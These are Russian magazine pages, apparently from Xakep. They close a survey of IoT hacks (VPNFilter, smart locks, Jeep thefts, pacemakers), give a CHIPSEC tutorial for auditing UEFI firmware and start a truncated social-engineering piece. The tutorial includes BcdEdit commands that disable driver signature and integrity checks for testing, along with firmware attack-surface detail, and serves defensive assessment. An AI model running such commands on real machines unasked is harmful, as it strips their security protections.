В результате без электричества оста лась немалая часть Западной Украины.





Расследованием инци дента занимались ведущие компании: ESET,  iSight,
Trend Micro и другие. По результатам их работы оказалось, что при чиной был
вредонос BlackEnergy, извес тный еще с 2007 года. Он неоднократно исполь‐
зовал ся  для  проведения  атак  на  пра вительственные  организации
и инфраструктуру компаний по всему миру.
  Не факт, правда, что электричество отключил сам вирус. Спе циалисты
видят и другое возможное объяснение. Сам по себе BlackEnergy лишь пре‐
доставил злоумышленникам дос туп к зараженным сетям. А имея прямой дос‐
туп, атакующие отклю чили критичес кие узлы энергосистем вручную.


Как хакеры вору ют нефть и уголь
В апреле 2016 года Евгений Касперский, выс тупая на тематичес кой кон‐
ференции, рассказал, как хакеры помога ют воровать горючие материалы
прямо в местах их добычи.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

        СМЕШНЫЕ
  И СТРАШНЫЕ ВЕЩИ
        ВСПОМИНАЕМ САМЫЕ ЗРЕЛИЩНЫЕ ВЗЛОМЫ
                    IOT ЗА ПОСЛЕДНИЕ НЕСКОЛЬКО ЛЕТ




«Во время заполнения огромного резервуара они взламывают SCADA‐сис‐
темы, снижают температуру, чтобы в резервуар вошло больше топлива, чем
нужно», — пояснил Касперский. В результате под конец дня в каждой цис‐
терне остается два‐три лишних про цента.
   Аналогичные трюки, по сло вам Касперского, при меняются для хищений
угля и других ресурсов. Для это го хакеры взламывают системы, контролиру‐
ющие загрузку вагонов, и меняют данные о весе перевозимых гру зов. «Обыч‐
ные преступле ния становятся все более умными и компьютеризирован‐
ными», — добавил Касперский.


Очистка воды под угро зой
В один прекрасный день сотрудники водо очистительного центра, наз вание
которого не стало достоянием общес твенности, об наружили, что автоматика
работает со странными сбо ями и уровень химикатов то и дело произвольно
меняется. Вызванная на подмогу команда специалистов из Verizon быстро
выяснила, что сбои обо рудования не случайны, — в работу станции вме‐
шались хакеры.





Практически вся инфраструктура была постро ена вокруг IBM AS/400 — мей‐
нфрейма образца 1988 года. К нему имел ся доступ из интернета, и через
него же проходил трафик веб‐сервера, где стояла система оплаты клиентских
счетов. За обслужива ние компь ютера отвечал все го один сотрудник —
не будь он на посту в нужный день, подозритель ные сбои остались бы
незамеченными.
   Расследование показало, что настрой ки системы кто‐то «подправил»
извне, причем IP‐адреса злодеев уже фигурирова ли в рас следованиях хак‐
тивистских кампаний.
  Оказалось, что хакеры проникли в систему через платежное веб‐приложе‐
ние и похитили данные двух с половиной миллионов клиентов. Попав на сер‐
вер, они обнаружили INI‐файл, содержавший учет ные данные адми нистра‐
тора AS/400 в виде простого текста. Они не поняли, что это за система, и ста‐
ли просто менять настройки, пытаясь разобраться.


VPNFilter
Новейшая и наибо лее комплексная угроза в мире IoT — это троян (и ботнет)
VPNFilter. Уже вскоре после первого об наружения VPNFilter заразил пол‐
миллиона роутеров Linksys, MikroTik, NETGEAR и TP‐Link, а также NAS про‐
изводства QNAP в 54 странах мира.
  Заражение этим червем делится на три ста дии, и с технической точки зре‐
ния можно даже считать, что это три разных вируса. Вредонос первой стадии
прост и легковесен; код второй стадии несет в себе опасную функцию само‐
уничтожения, после активации которой зараженное устройство превраща‐
ется в «кирпич», входя в бес конечный цикл перезагрузки. Третья фаза атаки
подразуме вает загрузку на зараженное устройство вре доносных плагинов,
каждый — со своей спецификой.
  Особо опасным VPNFilter делает то, что уже на первой стадии он неплохо
закрепляется на устройстве и прос той перезаг рузкой его не выкуришь (ранее
это свойство было уникально для зловреда Hide ‘N Seek). И при том что VPN‐
Filter не использует какие‐то слишком серь езные уяз вимости, его модульная
архитектура позволя ет атаковать мас су раз ных устройств благодаря боль‐
шому списку уже известных, но далеко не вез де закрытых багов.





Операторы VPNFilter способны совершать самые раз ные противоправные
действия при помощи своего ботнета. Они могут перехватывать трафик
и учетные данные от закрытых сетей и систем; могут обнаруживать промыш‐
ленное SCADA‐оборудование и заражать его специализированной мал‐
варью; могут использовать зараженные устройства как обычный ботнет,
скрывая за ним различные атаки; и, наконец, могут попросту вывести из строя
сотни тысяч устрой ств.
  По мнению экспертов, кое‐что роднит VPNFilter с малварью BlackEnergy.
Кстати, как и BlackEnergy, он успел засветиться в атаке на промышленный
объект на территории Украины.
  Подробнее о происходящем с VPNFilter читай в наших новос тях.



КОГДА УЯЗВИМОСТЬ ПОИСТИНЕ КРИТИЧНА
Иногда уязвимость имеет все шансы стать нас тоящей угрозой для жизни
или вывести из строя серь езное обо рудование — как мы видели в примере
с водоочистительной станцией. И если системы SCADA все же стараются
защищать как положено, то дела с безопасностью в дру гих областях могут
обстоять куда более плачевно.


Замки, сейфы и защитные системы
В теории наличие скважины — это первая причина уязвимос ти любого замка.
Если заменить ее компь ютером, который принима ет электронные ключи
по беспроводной связи, то такой замок будет куда надежнее. Увы, на прак‐
тике компании, которые бро сились этим заниматься, час то допускают такие
оплошности, что потенциальная воз можность вскрыть обычный замок мер‐
кнет в сравнении.
  К примеру, история с замками LockState показы вает, что старые добрые
проблемы с софтом в реальном мире выводят свя занные с ними неудобства
на принципиально новый уровень. Замки LockState очень популярны сре ди
пользователей Airbnb, а компания — официальный партнер сервиса. Открыть
такой замок можно как ключом, так и кодом, которые и выдают гостям. Когда
в августе прошлого года около 500 устрой ств перестали откры ваться кодами
из‐за глючного обновления прошивки, владельцам пришлось срочно впус‐
кать гостей вручную и сда вать замки в ремонт на неделю.





Можно вспомнить и прошлогоднюю же ис торию с сейфами для ору жия фир‐
мы Vaultek, которые разблокиру ются по Bluetooth из мобильного приложения.
Изучив такой сейф, пентестеры нашли много интерес ного. Во‐первых, вмес‐
те с командой открытия пересылается PIN‐код, но нет никакой проверки его
подлинности — достаточно привязать устройство к смартфону. Во‐вторых,
производитель, как оказалось, лгал нас чет шифрования (PIN пересылал ся
в виде простого текста). Атакующий может просто перехватить трафик Blue‐
tooth, и вот код у него в руках. А потом и пистолет.
  Даже если за производством гаджета стоит гигант индустрии, это может
ничего не значить. Умные замки и камеры наб людения Amazon, которые ком‐
пания предлагает использовать, чтобы курьер мог зайти в дом, когда никого
нет, оказались уязвимыми перед банальным спу фингом точки доступа.
Исследователи продемонстрировали программу, с помощью которой нечис‐
тый на руку курьер (или третье лицо) может отклю чить камеру от роутера.
При этом запись замрет на последнем кадре — закрытой двери. Замок тоже
перестанет работать, так как у него нет сво его соединения с интернетом.





Ну и конечно, всех превзошли раз работчики навес ных замков Tapplock. Собс‐
твенно, с учетом того что у этих замков на боку винт, который откручивается
обычной отверткой, о безопасности можно уже ничего не говорить. Однако
зачем отвертка, если код блокировки генерируется на основе MD5 от MAC‐
адреса замка? Иссле дова тели быстро написали PoC, который откры вает
любой Tapplock, находящийся поблизости. Как узнать, где именно? В ходе
другого исследования была обна ружена уяз вимость в веб‐админке, которая
выдавала не только ключи, но и координаты любого замка — нужно знать
только имя пользователя.


Автомобили
О взломе машин в наше время говорят час то. Еще в 2015 году двое иссле‐
дователей продемонстрировали, что уда ленный взлом авто возможен. Ста‐
раниями экспертов джип, за рулем которого находился журналист издания
Wired, в итоге оказался в кювете, тог да как пентестеры сидели дома с ноут‐
буками. Позже те же исследова тели нашли новый хак, для которого исполь‐
зовали CAN‐шину (и прямой дос туп к автомобилю).





Можешь не сомневаться, что эта тема интересна не только безопасникам.
С 2014 года группировка Dirty 30 угоняла внедорожники Jeep Wranglers
по всей Южной Калифор нии и переправляла их через мексиканскую границу.
Воры  успели  похитить  более  150  машин  суммарной  стоимостью
более 4,5 миллиона долларов, пока в 2017 году полиции наконец не удалось
переловить всех (или основную часть) учас тников.
  На протяже нии многих месяцев пра воохранители не могли  понять,
как именно действуют угонщики, почему в похищенных автомобилях не сра‐
батывает сигнализация, а сами машины не имеют никаких повреждений.
На записях с видеокамер было видно только, как люди садятся в машину
с ноутбуком и через некото рое время заводят мотор и уез жают.
   Как оказалось, злоумышленникам удалось получить дос туп к базе данных,
в которой хранились запас ные коды ключей для раз ных моделей Jeep Wran‐
gler. Используя заранее подсмот ренный на приборной панели VIN, «ключник»
загружал из БД два кода: первый был нужен непос редс твенно для изготов‐
ления физического дубликата ключей, вто рой передавался обратно лидеру
группы вместе с готовыми ключами.
   Угонщики быстро открывали водительскую дверь внедорожника дуб‐
ликатом клю ча, проникали в машину и вставляли ключ в замок зажигания.
После к порту Onboard Diagnostics System подклю чали портативный компь‐
ютер и использовали вто рой код, полученный из базы данных, чтобы синхро‐
низировать новый ключ с авто мобилем. Как только ключ становил ся пол‐
ноценной заменой настоящего, злоумышленники отключали сигнализацию
окончательно и уезжали на машине с мес та прес тупления.





Конечно, проблемы бывают не только в автомобилях производс тва  Fiat
Chrysler. В лабораторных условиях исследователи год за годом взламывают
самые разные марки. Только недавно пентест выявил множес тво уязвимос‐
тей в машинах BMW, в прош лом году была най дена воз можность копировать
брелоки Subaru, а еще чуть рань ше скомпромети ровать удалось модем,
который ставят в автомобили разных произво дителей по всему миру. А уж
в «Тесле», которую часто дразнят компьюте ром на колесах, дыры об наружи‐
ваются как по расписанию (правда, по инициативе самой компании).


Кардиостимуляторы
В конце августа 2016 года исследова тели стартапа MedSec заявили, что наш‐
ли уязвимости в оборудовании фирмы St. Jude Medical — электрокардиос‐
тимуляторах (имплантах, которые считыва ют сердечный ритм и стимулируют
биение). Последовали долгие разбирательства, в результате которых про‐
изводитель таки признал свою вину.





Уязвимости оказались реальными и весь ма опас ными. Их эксплуатация поз‐
воляет  неавторизованному  пользователю  получить  удаленный  доступ
к имплантированному пациенту RF‐кардиоустройству, подменив передатчик.
Подмена команд имплантированного устройства может привес ти к исто‐
щению заряда батареи, а также к уста новлению некорректного сердечного
ритма или некорректной подаче разряда.
  В результате было выпущено обновление прошивки, но все 465 тысяч
пациентов, в грудную клетку которым уже установили одну из уязвимых
моделей устройства, дол жны теперь посетить вра ча и получить критические
обновления.


НЕУТЕШИТЕЛЬНОЕ ЗАКЛЮЧЕНИЕ
Мы прошлись по большинс тву наиболее пугающих, забавных или просто
интересных случаев. Однако список инци дентов и выявленных уязвимостей,
связанных с (заметь — только зарождающейся) категорией умных бытовых
приборов, можно продолжать и продолжать. Тревожные кнопки, которые
можно отключить, находясь в непосредственной близос ти, роботы телеп‐
рисутствия, которых можно отследить уда лен но, умные телевизоры с уяз‐
вимостями и так далее и тому подобное.
  В начале апреля 2017 года был обна ружен один очень нетипичный вирус,
заражающий умные устройства, — он называ ется BrickerBot. Необычен он
тем, что охотится на незащищенные девай сы, но не выращивает из них
армию ботов, а выводит их из строя и уничтожа ет все данные на подключен‐
ных носителях. Впоследствии автор вредоноса нашел способ анонимно свя‐
заться с прессой и сообщил, что его целью было преподать урок произво‐
дителям уязвимого оборудования, а также предотвратить эпидемии других
вирусов.
   Тут‐то и начинаешь задумывать ся: если дес труктивная и злая штука вроде
BrickerBot — это пока что единс твенный сколько‐нибудь действенный способ
системно решить проб лему, то насколько же все запущено в этой индустрии?
ВЗЛОМ
ПЕНТЕСТ

                                                                             Егор Василенко
                                                                                       vasilenko.yegor@gmail.com
UEFI

ОЦЕНИВАЕМ ЗАЩИЩЕННОСТЬ
ПРОШИВКИ UEFI
С ПОМОЩЬЮ CHIPSEC





В  этой  статье мы  разберем  схе му функционирования
и устройство прошивки UEFI на материн ских платах с про‐
цессорами и чипсетами Intel, протестируем ее с помощью
CHIPSEC Framework и сделаем ряд не очень утешительных
выводов. :)


UNIFIED EXTENSIBLE FIRMWARE INTERFACE
После подачи питания на аппа ратную платформу ЭВМ должна произойти
корректная инициализация обо рудования и выбор загрузчи ка операционной
системы. Если раньше эту функцию выполнял всем извес тный BIOS Legacy, то
со временем производители аппаратных платформ пришли к использованию
более усовершенствованной технологии — UEFI.
  Некоторые отличия между BIOS Legacy и UEFI отражены в сравнительной
таблице.


                   Харак теристики     Харак теристики
                    BIOS Legacy         UEFI

                                         Режим реальных адре‐
 Поддерживаемые
                     Режим     реальных   сов,     защищенный
 режимы работы про‐
                      адресов             режим работы процес‐
 цессора
                                           сора

 Поддержка вир туаль‐
                    Не поддерживает      Поддерживает
 ной памяти

 Объем используемой
                      1 Мбайт            Не ограничен
 оперативной памяти

 Пространство  опци‐
 онального ПЗУ (Op‐   1 Мбайт            Не ограниче но
  tion ROM)

                                              16‐битный,  32‐битный,
 Доступ к регистрам     16‐бит ный
                                              64‐битный

 Независимость
                    Не обеспечива ет      Обеспечивает
  от архитектуры

 Язык     программи‐
                      Ас семблер           Си/ассемблер
 рования

 Функция безопасной
                     От сутству ет          Присутствует
  загрузки

 Таблица    разделов
                 MBR               GPT
 жесткого диска

Спецификация UEFI описывает интерфейс меж ду операционной системой
и программным обеспечением аппаратной платформы во время загрузки.
Основная идея, заложенная в спецификации, — сделать прошивку модульной
и расширяемой.
  Изменениями в спецификации управляет сообщество Uniﬁed Extensible
Firmware Interface Forum, основная задача которого — расширять и улучшать
существующую спецификацию, добавляя новые функци ональные возможнос‐
ти и исправляя текущие недос татки. Для раз работчиков программных ком‐
понентов  спецификация  UEFI  предос тавляет  воз можнос ти  повторного
использования кода, расширя емос ти, модульности, а также легкого прототи‐
пирования в процессе раз работки.
   Хорошо это или плохо? С одной сто роны, рас ширяемость и модульность
позволяют разработчикам наделять прошивку дополнительными функци‐
ональными возможностями. С дру гой — обилие программного кода делает
ее более уязвимой. Так как низкоуровневое программное обеспечение про‐
шивки UEFI первостепенно в системе, уровень защищенности прошивки
играет основную роль при оценке защищенности всей ЭВМ.


АППАРАТНОЕ РАСПОЛОЖЕНИЕ ПРОШИВКИ UEFI
Совокупность всех прошивок в системе называют прошивкой платформы.
Как правило, она расположена во флеш‐памяти SPI (Flash memory). В этой же
памяти располагается прошивка UEFI.





            Аппаратное рас положение прошивки платформы

Для  того  чтобы  система  мог ла  различать  про шивки  между  собой,
флеш‐память делится на регионы. Доступ к регионам разграничивает встро‐
енный в чипсет PCH SPI‐контроллер (в современных системах PCH играет
роль южного моста). На скриншоте представлен дамп флеш‐памяти SPI в ути‐
лите UEFITool.





                Дамп флеш‐памяти SPI в UEFITool

Описание некоторых регионов флеш‐памяти SPI:
 • Flash Descriptor (Descriptor region) — реги он дес криптора, содержащий
   основные смещения и нас тройки флеш‐памяти SPI;
 • GbE region — регион, содержащий основные нас тройки сетевой карты;
 • ME region — регион, содержащий прошивку ME (ME выполняет функции
   управления энергопотреблением, функции ини циализации и  запуска
   основного процессора);
 • UEFI region (BIOS region) — содержит прошивку UEFI;
 • PDR region — регион, предназна ченный для описания возможностей,
   зависящих от платформы.


ОБРАЗЫ И ПРОТОКОЛЫ В UEFI
Спецификация UEFI позволяет расширять про шивку через загрузку образов.
Образ в UEFI может быть представлен в виде отдель ного драйвера или при‐
ложения (наглядный пример — приложение UEFI Shell). Структура любого
образа описывается форматом PE32/PE32+.
   Расширение, а  также идентифика ция компонентов UEFI выполняется
с помощью GUID‐записей. GUID представляет собой уни кальный 128‐битный
идентификатор, соот ветствующий тому или иному компоненту прошивки.





                Некото рые обра зы UEFI в UEFITool

Лю бое устройство или образ в UEFI имеют собс твенный протокол обработки.
Каждый протокол состоит из GUID и структуры интерфейса протокола. Струк‐
тура интерфейса протокола содержит функции и данные, которые исполь‐
зуются для доступа к тому или иному устройству. Управление протоколами
обеспечивают специальные службы UEFI (LocateProtocol, OpenProtocol и дру‐
гие).


ОСНОВНЫЕ ФАЗЫ ФУНКЦИОНИРОВАНИЯ ПО UEFI
Работу ПО UEFI условно мож но разбить на два эта па:
 • во время инициализации платформы;
 • во время загрузки и работы ОС.





  Схема функционирова ния про шивки UEFI во время инициализации плат‐
  формы

Ниже описано, за что отвечает каждая фаза.

SEC:
 • обработка всех событий перезапуска платформы;
 • создание хранилища временной памяти;
 • проверка целостности и подлинности элементов прошивки;
 • подготовка и передача необходимой информа ции в сле дующую фазу.

PEI:
 • инициализация постоянной памяти;
 • описание памяти в специальных структурах Hand‐Oﬀ Blocks (HOBs);
 • описание адресов размещений микропрограмм в HOBs‐структурах;
 • передача управле ния в фазу среды выполнения драйверов.

DXE:
 • инициализация служб заг рузки, служб реального времени выполнения
   и служб DXE (DXE Services);
 • обнаружение и выполнение драйверов DXE;
 • инициализация процессора, набора микросхем и компонентов плат‐
  формы.

BDS:
 • инициализация консольных устройств;
 • загрузка драйверов устройств;
 • попытка загрузки в ОС;
 • если попытка не удалась, повторно выполняется фаза DXE.

В качестве отдельной фазы выделяют режим системного управле ния (SMM).


РЕЖИМ СИСТЕМНОГО УПРАВЛЕНИЯ (SMM)
SMM — специальный режим работы, в который процессор переходит через
вызов прерывания управления системой (SMI). Среда выпол нения кода SMM
инициализируется драйверами служб заг рузки и находится в специально
выделенной привилегиро ванной области памяти SMRAM (System Manage‐
ment Random Access Memory).
   Разработчики аппаратных платформ могут использовать данный режим
для любых целей (управление питанием, обработка системных ошибок, обес‐
печение безопасности прошивки и другие).
  Режим системного управления считается режимом –2 кольца защиты про‐
цессора, а в связи с тем, что SMI‐прерыва ние легко вызвать из ядра ОС, он
представ ляет особый интерес для зло умышленни ка.


SMRAM
SMRAM — это защищенная на уровне PCH область физической памяти,
которая представляет собой адресное пространс тво при входе в SMM‐
режим. Эта область памяти содержит код и данные обработчиков SMI‐пре‐
рываний, а также сохраненный контекст процессора и операционной сис‐
темы перед вызовом SMI‐прерывания.
  Адреса внутри SMRAM представляют собой смещения относительно зна‐
чения SMBASE, которое, в свою очередь, явля ется внутренним регис тром
процессора, содержащим базовый адрес SMRAM. Отмечу, что SMBASE —
это один из MSR‐регис тров.
  Параметры управления доступом к SMRAM прописаны в конфигурации 8‐
битного регистра SMRAM Control.


SMI-пре рывания
SMI (System Management Interrupt) — единственный способ перевести про‐
цессор в режим системного управления. SMI представляет собой внешнее
прерывание, работающее независимо от механиз ма обработки прерываний
и исклю чений процессора.
   SMI‐прерывания бывают аппаратными, системны ми и программными.
Со списком все возможных событий, генерирующих SMI‐прерывания, можно
ознакомиться здесь (Power Management).
  Вызвать программное SMI‐прерывание можно при помощи записи в порт
ввода‐вывода APM (Advanced Power Management). Данный порт имеет два
регистра: APM_CNT (0xB2) и APM_STS (0xB3).
  APM_CNT (0xB2) — управляющий регистр. Для вызова SMI‐пре рывания
необходимо записать в этот регистр байт — номер (код) прерывания.





       Запись в регистр APM_CNT с помощью ути литы Read & Write

APM_STS (0xB3) — регистр ста туса. Запись в данный регистр не вызывает
SMI‐прерывание, тем не менее он может быть использован для передачи
дополнительной информа ции обра бот чику SMI‐прерывания. SMI‐пре рывание
будет сгенерировано только в том случае, если в конфигурационном регис‐
тре APM установ лен бит APMC_EN.




     Вызов SMI‐прерывания в дизассемблированном коде прошивки


Об работчики SMI-пре рываний
Обработчики SMI‐прерываний вызываются процессором при возникновении
соответствующе го SMI‐прерывания и возвращаются в операционную сис‐
тему с помощью специальной инструкции RSM. Основным механизмом
передачи информации и регулирова ния деятельности обработчиков SMI‐
прерываний в режиме SMM является SMST (System Management System Ta‐
ble). SMST обеспечивает доступ к службам режима SMM.


CHIPSEC
Что такое CHIPSEC?
CHIPSEC представляет собой фреймворк, написанный на Python. Его можно
использовать как из командной строки, так и в качестве импортируемых
Python‐модулей,  что поз воляет с  легкостью писать собс твенные тес ты
для оценки защищенности. Первая версия фреймворка была представлена
в 2014 году на конференции CanSecWest.
  CHIPSEC можно исполь зовать из операционной системы Windows, Linux,
macOS или вообще без операционной системы. В таком случае понадобится
UEFI Shell — стандартное UEFI‐приложение.


             INFO

                     Последние наборы системной логики (Intel 300
                           Series) и процессоры Core 8‐го поколения (Coffee
                         Lake) не поддерживаются CHIPSEC.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        ПЕНТЕСТ UEFI
                   ОЦЕНИВАЕМ ЗАЩИЩЕННОСТЬ
            ПРОШИВКИ UEFI С ПОМОЩЬЮ CHIPSEC





Установка
Разберем установку фреймворка в ОС Linux и Windows. Будем следовать инс‐
трукциям из мануала. Там же мож но най ти инс трукции по установке CHIPSEC
в macOS и по запуску в UEFI Shell.


           WARNING

                     Настоятельно   рекомен дует ся   устанавливать
                      и использовать фреймворк только на тестовых
                    ЭВМ.



Linux
Сначала устанавливаем зависимос ти. Для сис тем с пакетным менеджером
yum:


> yum install kernel kernel‐devel‐$(uname ‐r) python python‐devel
gcc nasm redhat‐rpm ‐config
> pip install setuptools

Для систем с пакетным менеджером apt:


> apt‐get install build‐essential python‐dev python gcc \
linux‐headers‐$(uname ‐r) nasm
> pip install setuptools

Затем устанавливаем CHIPSEC. Проще всего уста новить из PyPI:


> pip install chipsec

Кроме того, установить мож но вручную:


> git clone https://github.com/chipsec/chipsec
> python setup.py install

Наконец, отключаем безопас ную загрузку для нормальной работы драйвера.


Windows
Для установки CHIPSEC в Windows необходимо вручную собрать и подписать
(только на Windows x64) драйвер для взаимодействия фреймворка с ком‐
понентами аппаратной платформы.
  Сначала устанавливаем необходимые пакеты.


> pip install setuptools
> pip install pywin32

Затем собираем и подписываем драйвер по отдельной инструкции. Копиру‐
ем подписанный драйвер в директорию <CHIPSEC_DIRECTORY>\chipsec\
helper\win\win7_amd64 или <CHIPSEC_DIRECTORY>\chipsec\helper\win\
win7_ x86 в зависимости от архи тектуры процессора на тестируемой сис‐
теме.
  После того, как драйвер ока жется в нужной директории, устанавливаем
CHIPSEC.


> pip install chipsec

В данном случае под писанный драйвер следовало положить в файл <
PYTHON_DIRECTORY>\Lib\site‐packages\chipsec\helper\win\
win7_amd64\chipsec_hlpr.sys. При кор ректной установке в директории
<PYTHON_DIRECTORY>\Scripts должны появить ся исполня емые файлы с дву‐
мя основными модулями CHIPSEC.





                  Ос новные модули CHIPSEC

Отключаем обязательную проверку подписи драйверов. Это необходимо
делать после каждого переза пуска системы:
 • Переходим в меню допол нитель ных парамет ров загрузки:


   > shutdown /r /t 0 /o

 • «Поиск и устранение неисправностей → Допол нительные параметры →
   Параметры загрузки → Перезагрузить».
 • В появившемся после перезагрузки списке команд выбираем «Отключить
   обязательную проверку подписи драйверов».

Данный способ работает без отключения опции безопасной  загрузки.
В качестве альтернативы можно отклю чить безопас ную загрузку и выполнить
следующие команды в CMD (Administrator):


> BcdEdit /set noIntegrityChecks ON
> BcdEdit /set loadoptions DISABLE_INTEGRITY_CHECKS

После чего устанавливаем тес товый режим работы сис темы и перезагружа‐
емся.


> BcdEdit /set TESTSIGNING ON
> shutdown ‐r ‐t 0

Чтобы вернуть систему в первоначальное сос тояние, выполняем обратные
команды и еще раз перезагружаемся:


> BcdEdit /set noIntegrityChecks OFF
> BcdEdit /set loadoptions ENABLE_INTEGRITY_CHECKS
> BcdEdit /set TESTSIGNING OFF


Описание модулей CHIPSEC
Две основные утилиты в CHIPSEC — chipsec_main и chipsec_util. Утилита
chipsec_util содержит набор инструментов для вза имодействия с аппаратной
платформой. Чтобы прос мотреть весь набор функций, предоставля емый дан‐
ной утилитой, достаточ но выполнить команду chipsec_util в командной
строке (результат).
   Утилита chipsec_main запус кает тесты. Чтобы запус тить стандартный
набор тестов для оцен ки защищен ности аппа рат ной платформы, выполняем
chipsec_main в командной строке (пол ный лог).





                  Результат работы chipsec_main

Для запуска отдельного модуля с тестом можно воспользоваться опцией ‐m
или ‐‐module.





               Запуск модуля common.bios_kbrd_buﬀer

Полный список опций и формат возвращаемого значения chipsec_main мож‐
но посмотреть здесь. Список поддерживаемых CHIPSEC аппаратных плат‐
форм — здесь. Если платформа не поддерживается, пользоваться фрей‐
мворком все равно мож но. В таком случае CHIPSEC пропус тит все тесты,
специфичные для конкретных аппа ратных платформ.





               Дополнительные опции chipsec_main

Каждый из отдельных тестов CHIPSEC соз дан на основании реальных атак
или рекомендаций по безопас ной разработке прошивки. В таблице описаны
основные тесты защищенности UEFI. За более под робной информацией
можно обратиться к ману алу CHIPSEC.

Об щая оцен ка защищен ности


 Наз вание модуля   Описание модуля

                    Проверяет  переменные  безопас ной  загрузки
                        UEFI (Secure Boot key/whitelist/blacklist), произво‐
 common.secureboot.‐   дит   собственные   попытки   модификации
  variables             переменных (переменные должны иметь пра‐
                        виль ные атрибуты дос тупа и защиту от несанкци‐
                      онированной модификации)

 common.ueﬁ.ac‐       Проверяет   атрибуты   доступа   глобальных
 cess_ueﬁspec         переменных UEFI на соответствие спецификации

                    Проверяет компоненты прошивки UEFI (прошив‐
                         ка не должна содержать вредоносных компонен‐
  tools.ueﬁ.blacklist
                            тов, определенных в специальном конфигура‐
                      ционном файле)

                       Генерирует устойчивый список образов  UEFI,
  tools.ueﬁ.whitelist       после чего сверяет новые состояния образов
                       с данным спис ком во избежание модификаций

                    Проверяет буфер клавиатуры BIOS на наличие
 common.bios_k‐        паролей BIOS/HDD/pre‐bot, чтобы предотвратить
  brd_buﬀer              ата ку, описанную здесь (в идеале буфер кла‐
                         виату ры BIOS должен быть пустым)

                    Проверяет  безопасность  сценария  загрузки
                        из режима сна S3, реализованного на базе про‐
 common.ueﬁ.s3‐
                     шивок UEFI. Основани ем для создания данного
  bootscript
                      модуля послужила  уязвимость CVE‐2014‐8274.
                    Примеры атак: 1, 2, 3

                    Проверяет архитектурные особенности IA32/IA64
                         (архитектурные осо бенности, включая регистры
 common.ia32cfg
                    MSR, должны быть правиль но сконфигурированы
                      и заб локированы)

                  Пытает ся создать поддельные диапазоны MMIO
                      (Memory‐mapped  I/O)  в  памяти, перемес тить
                       аппаратное обеспечение MMIO BAR (MMIO Ba‐
  tools.smm.rogue_m‐
                                sic) в поддельную область памяти, после чего
 mio_bar
                      наблюда ет за изменениями, сделанными обра‐
                       ботчиками  SMI‐прерываний  в перемещенном
                      диапазоне MMIO

Оцен ка защищен ности флеш‑памяти SPI


 Наз вание модуля   Описание модуля

                    Проверяет     возможность    модификации
                      флеш‐памяти  SPI. Тест основан на проверке
 common.bios_wp
                       регистров чипсета PR0‐PRN и флагов регистра
                     BIOS_CNTL

                    Проверяет конфигурацию событий  SMI. Если
                        конфигурация  событий  SMI  нас троена  неп‐
 common.bios_smi
                       равильно, теря ет смысл защита от перезаписи,
                      основанная на флагах регистра BIOS_CNTL

                     Считывает SPI Flash Descriptor, проверяет прог‐
 common.spi_desc
                     раммную воз можность его модификации

                    Проверяет  зна чение  бита FDOPSS  регистра
 common.spi_fdopss    HSFS   контроллера   SPI,   сигнализирующего
                     о переза писи SPI Flash Descriptor

                    Проверяет зна чение бита FLOCKDN регистра
                    HSFS контрол лера SPI. Если FLOCKDN не уста‐
 common.spi_lock       новлен, конфигура ция SPI‐контрол лера, включая
                       PR‐регистры, может быть модифицирована зло‐
                   умышленником

                    Проверяет   блокировку   реги она   с   UEFI
 common.bios_ts
                       во флеш‐памяти SPI


Оцен ка защищен ности SMM


 Наз вание модуля   Описание модуля

                    Проверяет конфигурацию регистра SMRAM Con‐
 common.smm
                                    trol во избежание дос тупа к SMRAM

 remap              Проверяет возможность переназначения SMRAM

                    Проверяет возможность реализации атаки SMM
 common.smrr
                       cache poisoning

                    Проверяет возможность реализации атаки типа
 tools.smm.smm_ptr
                      про верки ука зателей

 smm_dma           Проверяет возможность реализации DMA‐атаки


CHIPSEC в Python
Утилиты chipsec_main и chipsec_util мож но использовать не только из коман‐
дной строки, но и в качестве импортируемых Python‐модулей. Это поз воляет
создавать собственные сценарии для оценки защищенности аппаратной
платформы или просто использовать функциональность chipsec_util в Python.
   Чтобы выполнить необ ходимую команду, переда ем массив с опциями
в функцию chipsec_main.main() или chipsec_util.main(). Например, так
можно вызвать программное SMI‐прерывание с кодом 0x0E:





   Вызов программного SMI‐прерывания в Python с помощью chipsec_util

В качестве примера использования CHIPSEC в Python был написан скрипт
chipsec_script.py. Он запускает определен ный набор модулей CHIPSEC
и делает вывод о состоянии защищенности аппа ратной платформы.





              Результат работы скрипта chipsec_script.py


Прак тические результаты
Мы протестировали данным  скриптом  четыре  аппаратные  платформы.
Результаты получились следующие (логи):


                                   WARNING (необ -
 Аппаратная плат-      FAIL (защита       ходимы допол -
 форма               не обеспечена)      нительные про -
                                        верки)

  Mobile  2rd  Generation
 Core  Processor  (Sandy   common.bios_wp,       common.bios_k‐
  Bridge CPU  /  Cougar   common.bios_smi       brd_buﬀer
  Point PCH)

  Mobile  3rd  Generation
 Core   Processor    (Ivy   common.bios_wp,       common.bios_k‐
  Bridge CPU  /  Panther   common.bios_smi       brd_buﬀer
  Point PCH)

  Mobile  7th  Generation
                                               common.ueﬁ.s3‐
 Core  Processor  (Kaby‐   common.spi_desc
                                                         bootscript
  lake U)

 Unknown Platform     —                smm_dma

Видим, что плат формы c архитектурами Intel Mobile 2rd Generation и Mobile
3rd Generation уязвимы перед модификацией флеш‐памяти SPI:
 • проигнорирована защита, осно ванная на использовании регистров PR0‐
   PRN;
 • не выставлены флаги регистра BIOS_CNTL;
 • неправильно  настро ена  конфигурация  событий  SMI,  что  позволяет
   подавить вызов SMI‐прерывания при попытке модификации флеш‐памяти
   SPI.

У платформы c архитектурой Intel Mobile 7th Generation отсутс твует защита
от программной модификации SPI Flash Descriptor.


ЗАКЛЮЧЕНИЕ
UEFI — это root of trust всей электронно‐вычислитель ной системы, и безопас‐
ность прошивки UEFI зас луживает отдельного внимания.
   Практика показала, что существу ющие защитные решения и рекомен‐
дации по безопасной раз работке  могут обес печить дол жный уровень
защищенности компонентов аппа ратной платформы, но зачастую произво‐
дители игнорируют их.
  CHIPSEC Framework позволяет понять, насколько прошивка UEFI соот‐
ветствует рекомен дациям по безопас ной раз работке, а также оценить ее
устойчивость перед известными ата ками.
 ВЗЛОМ
  САМОЕ КРУТОЕ
    С МИРОВЫХ ИБ-КОНФЕРЕНЦИЙ





                    ИНТЕРЕСНЫЕ ДОКЛАДЫ,
                       ПОСВЯЩЕННЫЕ
                СОЦИАЛЬНОЙ ИНЖЕНЕРИИАнна Серохвостова
 anna.barnaul@list.ru





 Часто самый простой способ про никновения в целевую сис‐
